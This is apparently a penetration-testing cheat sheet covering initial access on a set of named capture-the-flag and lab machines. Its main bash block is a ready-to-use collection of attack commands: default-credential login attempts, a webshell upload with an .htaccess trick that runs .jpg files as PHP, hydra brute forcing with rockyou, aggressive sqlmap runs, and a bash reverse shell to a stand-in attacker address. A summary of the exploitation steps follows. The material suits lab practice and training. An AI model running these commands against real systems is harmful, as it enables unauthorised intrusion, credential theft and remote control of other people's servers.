# 🔓 Initial Access (Machines 131–140)

```bash
# Common Web Exploits
curl -X POST http://<IP>/login -d 'username=admin&password=admin'       # Test default creds
curl http://<IP>/config.php | grep pass                                  # Look for exposed passwords
whatweb http://<IP>                                                      # Identify CMS
wpscan --url http://<IP> --enumerate u                                   # WP user enum
joomscan -u http://<IP>                                                  # Joomla vulnerability scan
droopescan scan drupal -u http://<IP>                                    # Drupal scan

# File Upload Exploits
curl -F "file=@shell.php" http://<IP>/upload                             # Upload webshell
mv shell.php shell.php.jpg; echo "AddType application/x-httpd-php .jpg" > .htaccess

# Auth Bypass / Exploits
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /login
sqlmap -u "http://<IP>/login.php" --data="username=admin&password=pass" --risk=3 --level=5 --batch

# Shell Access
nc -lvnp 4444                                                            # Setup listener
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1                              # Reverse shell payload

# SSH with Leaked/Cracked Credentials
ssh user@<IP> -p 22
```

---

## 🧠 Summary (131–140)

- Used default creds (admin:admin) for CMS and panel access.
- Exploited exposed `config.php` to get DB password and login to phpMyAdmin.
- File upload vulnerability exploited with .php.jpg bypass trick.
- SQL Injection on login form used to dump users and escalate access.
- Reverse shell obtained via vulnerable image upload endpoint.
- SSH login successful using leaked key from /var/www/.ssh/id_rsa.

```

# 📁 Machines Covered
- HTB-Koality
- THM-Anonymous
- PG-Staging
- VulnLab-EscapeX
- THM-RepairStation
- HTB-DistroDrop
- VulnLab-Reflection
- PG-Confused
- PG-Groovy
- THM-Terminal